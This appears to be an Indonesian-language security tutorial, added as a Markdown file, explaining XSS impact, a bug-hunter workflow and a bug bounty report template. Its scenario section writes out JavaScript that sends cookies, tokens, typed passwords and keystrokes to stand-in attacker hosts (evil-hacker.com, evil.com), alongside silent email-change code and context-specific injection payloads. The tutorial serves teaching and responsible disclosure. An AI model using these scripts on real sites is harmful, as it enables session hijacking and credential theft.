@@ -1,0 +1,187 @@
+# Cross-Site Scripting (XSS): Anatomi Serangan Nyata & Metodologi Bug Hunter
+
+Banyak pemula dalam dunia keamanan web sering bertanya: **"XSS itu kalau menyerang dampaknya seperti apa? Kan cuma menyisipkan JavaScript dan memunculkan pop-up `alert(1)`?"** serta **"Bagaimana cara bug hunter menemukan dan mendokumentasikan temuan XSS agar diterima (triaged) di program Bug Bounty?"**
+
+Pop-up `alert(1)` hanyalah pembuktian (*Proof of Concept*) bahwa peramban korban bersedia mengeksekusi skrip kita. Di dunia nyata, JavaScript yang berjalan di peramban korban memiliki **hak akses penuh (*Same-Origin Privileges*)** atas sesi akun korban di situs tersebut.
+
+---
+
+## 1. Infografis: Dari alert(1) Menuju Dampak Nyata & Metodologi Bug Hunter
+
+![XSS Real World and Bug Hunting](/images/xss-real-world-hunter.svg)
+
+---
+
+## 2. Lima Skenario Serangan Nyata XSS (Real-World Attack Scenarios)
+
+Berikut adalah 5 skenario eksploitasi berbahaya yang dapat dilakukan penyerang melalui XSS:
+
+---
+
+### Skenario 1: Pencurian Token & Cookie Sesi (Account Takeover)
+Jika token login disimpan di `localStorage` atau Cookie tanpa perlindungan flag `HttpOnly`, penyerang dapat mengirimkan data tersebut ke server penyerang secara instan:
+
+```javascript
+// Mengirim token / cookie korban secara diam-diam ke server hacker
+fetch('https://evil-hacker.com/steal?data=' + encodeURIComponent(
+  localStorage.getItem('token') || document.cookie
+));
+```
+
+**Dampak:** Penyerang mendapatkan token sesi korban dan dapat langsung login ke akun korban dari perangkat lain tanpa perlu mengetahui kata sandi aslinya!
+
+---
+
+### Skenario 2: Eksekusi Aksi Diam-diam di Latar Belakang (Silent State-Changing)
+Penyerang tidak perlu mencuri token keluar jika penyerang bisa langsung **memerintahkan browser korban untuk melakukan aksi jahat saat itu juga**:
+
+```javascript
+// Otomatis mengubah email profil korban saat halaman terbuka
+fetch('/api/user/change-email', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer ' + localStorage.getItem('token')
+  },
+  body: JSON.stringify({ email: 'hacker@evil.com' })
+});
+```
+
+**Dampak:** Email korban langsung berubah menjadi email penyerang di background tanpa korban melihat atau menekan tombol apa pun (*Full Account Takeover*).
+
+---
+
+### Skenario 3: In-Session Phishing (Form Login Palsu di Domain Asli)
+Ini adalah teknik manipulasi tampilan (*DOM Defacement*) yang sangat meyakinkan:
+
+```javascript
+document.body.innerHTML = `
+  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999;text-align:center;padding-top:100px;">
+    <h2>Sesi Anda Telah Berakhir</h2>
+    <p>Silakan masukkan kata sandi Anda untuk melanjutkan:</p>
+    <input type="password" id="pass" placeholder="Password" />
+    <button onclick="fetch('https://evil.com/loot?p=' + document.getElementById('pass').value)">Login</button>
+  </div>
+`;
+```
+
+**Mengapa korban pasti percaya?**
+Karena URL di browser korban **tetap menunjukkan alamat resmi** (misalnya `https://bank.com` dengan gembok hijau HTTPS), sehingga korban tidak akan curiga bahwa form login tersebut dibuat oleh skrip XSS penyerang.
+
+---
+
+### Skenario 4: Live Keylogger (Merekam Setiap Ketikan Korban)
+Skrip XSS dapat memasang *event listener* pada keyboard untuk merekam apa pun yang diketik korban secara realtime:
+
+```javascript
+document.addEventListener('keypress', (e) => {
+  // Mengirim setiap tombol keyboard yang ditekan korban ke server hacker
+  new Image().src = 'https://evil.com/log?key=' + e.key;
+});
+```
+
+**Dampak:** Nomor kartu kredit, obrolan rahasia, kata sandi baru, dan data sensitif yang sedang diketik korban langsung terkirim ke penyerang.
+
+---
+
+### Skenario 5: XSS Worm (Menyebar Sendiri Secara Otomatis)
+Jika celah XSS berada pada fitur sosial (seperti kolom komentar, bio profil, atau postingan):
+
+1. Korban Budi membuka profil penyerang yang terinfeksi XSS.
+2. Skrip XSS di profil penyerang otomatis berjalan di browser Budi.
+3. Skrip tersebut menyuruh browser Budi untuk:
+   * Mengirim permintaan pertemanan ke penyerang.
+   * **Menyalin skrip XSS yang sama ke dalam bio profil Budi sendiri!**
+4. Siapa pun yang membuka profil Budi akan ikut terinfeksi dan menyebarkannya lagi ke seluruh pengguna aplikasi.
+
+> [!NOTE]
+> **Contoh Sejarah Nyata (Samy Worm di MySpace):**
+> Pada tahun 2005, Samy Kamkar menaruh payload XSS di profil MySpace miliknya. Dalam waktu kurang dari **20 jam**, worm tersebut telah menginfeksi dan menyebar ke lebih dari **1.000.000 pengguna** MySpace dan melumpuhkan server sementara.
+
+---
+
+## 3. Metodologi Bug Hunter: Workflow 4 Langkah Menemukan XSS
+
+Berikut adalah alur kerja sistematis yang digunakan para peneliti keamanan saat berburu bug XSS:
+
+```text
+[ 1. Injeksi Canary String ] ──► [ 2. Periksa Konteks Output ] ──► [ 3. Uji Karakter yang Lolos ] ──► [ 4. Eksekusi Safe PoC ]
+ (misal: testxss123'"<>)         (Cari di HTML / JS / Atribut)        (Cek apakah <, >, ' di-encode)    (alert(document.domain))
+```
+
+### Langkah 1: Kirim String Penanda Unik (Canary String)
+Jangan langsung mengirim payload berat seperti `<script>alert(1)</script>` karena bisa memicu WAF dan membingungkan karakter mana yang sebenarnya diblokir. Kirim string uji unik:
+```text
+hunter123'"<>/
+```
+
+### Langkah 2: Temukan Output (Sink) di DevTools / View Source
+Buka **Inspect Element** di peramban dan cari kata `hunter123`. Perhatikan di mana posisinya:
+* **HTML Body:** `<div>Hasil: hunter123'"<>/</div>`
+* **Atribut Tag:** `<input value="hunter123'"<>/">` atau `<a href="hunter123'">`
+* **Script Tag:** `<script>var query = "hunter123'"<>/";</script>`
+
+### Langkah 3: Analisis Karakter yang Lolos (Unescaped Character Analysis)
+Periksa apakah karakter khusus kamu diubah menjadi entitas HTML:
+* Jika `<` menjadi `&lt;` dan `"` menjadi `&quot;`, tag baru tidak bisa dibuat.
+* Tetapi jika `'` atau `"` **TETAP UTUH** di dalam atribut atau blok `<script>`, kamu bisa melakukan **Breakout**!
+
+### Langkah 4: Pasang Payload yang Sesuai Konteks
+* Di dalam `<a href="...">` → `javascript:alert(document.domain)`
+* Di dalam HTML Body → `<img src=x onerror=alert(document.domain)>`
+* Di dalam blok `<script>` → `"-alert(document.domain)-"`
+
+---
+
+## 4. Standar PoC & Format Laporan Bug Bounty Resmi
+
+Dalam program Bug Bounty resmi (seperti HackerOne atau Bugcrowd), kamu wajib menggunakan payload pembuktian yang aman:
+
+### Mengapa `alert(document.domain)` Adalah Standar Industri?
+Menampilkan domain target di dalam dialog pop-up membuktikan bahwa script berhasil dieksekusi di origin resmi aplikasi, bukan di iframe sandbox atau domain luar.
+
+### Klasifikasi Severity XSS:
+| Tipe XSS | Penjelasan Dampak | Severity Standar |
+| :--- | :--- | :--- |
+| **Reflected XSS** | Memerlukan interaksi korban mengklik tautan khusus. | **Medium (CVSS ~6.1)** |
+| **Stored XSS** | Skrip tersimpan di database dan otomatis berjalan pada setiap pengunjung (0-Click). | **High (CVSS ~8.0 - 8.8)** |
+| **DOM-based XSS** | Manipulasi eksekusi skrip di sisi klien melalui sink rentan (`innerHTML`, `eval()`). | **Medium - High** |
+
+---
+
+## 5. Template Laporan Bug Bounty XSS Siap Kirim
+
+Berikut adalah format laporan profesional yang siap diajukan ke program bug bounty:
+
+```markdown
+### Summary
+Reflected Cross-Site Scripting (XSS) vulnerability was identified on the `/search` endpoint via the `query` parameter. This allows an attacker to execute arbitrary JavaScript in the victim's browser context.
+
+### Vulnerable Endpoint & Parameter
+- **URL:** `https://target.com/search?query=PAYLOAD`
+- **Parameter:** `query` (GET)
+
+### Steps to Reproduce
+1. Log in to the application as a standard user.
+2. Navigate to the following crafted URL:
+   `https://target.com/search?query=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E`
+3. Observe that an alert pop-up displaying `target.com` is rendered immediately upon page load.
+
+### Proof of Concept (Screenshot)
+[Lampirkan screenshot pop-up alert(document.domain) dengan URL bar terlihat jelas]
+
+### Impact
+An attacker can trick authenticated users into visiting this URL, leading to session hijacking, in-session phishing, or unauthorized state-changing actions on behalf of the victim.
+
+### Remediation
+- Implement context-aware output encoding (e.g., HTML Entity Encoding).
+- Implement a robust Content Security Policy (CSP) restricting inline scripts.
+```
+
+---
+
+## 6. Aturan Emas Etika Bug Hunter
+
+1. **Jangan Menguji di Akun Pengguna Lain:** Selalu buat dan gunakan 2 akun milikmu sendiri (Akun A sebagai penyerang, Akun B sebagai korban).
+2. **Bersihkan Payload Stored XSS:** Segera hapus postingan atau komentar uji coba setelah mengambil screenshot PoC agar tidak mengganggu pengguna nyata.
+3. **Jangan Pernah Mencuri Data Riil:** Cukup buktikan eksekusi kode melalui `alert(document.domain)` atau `console.log(document.origin)`.
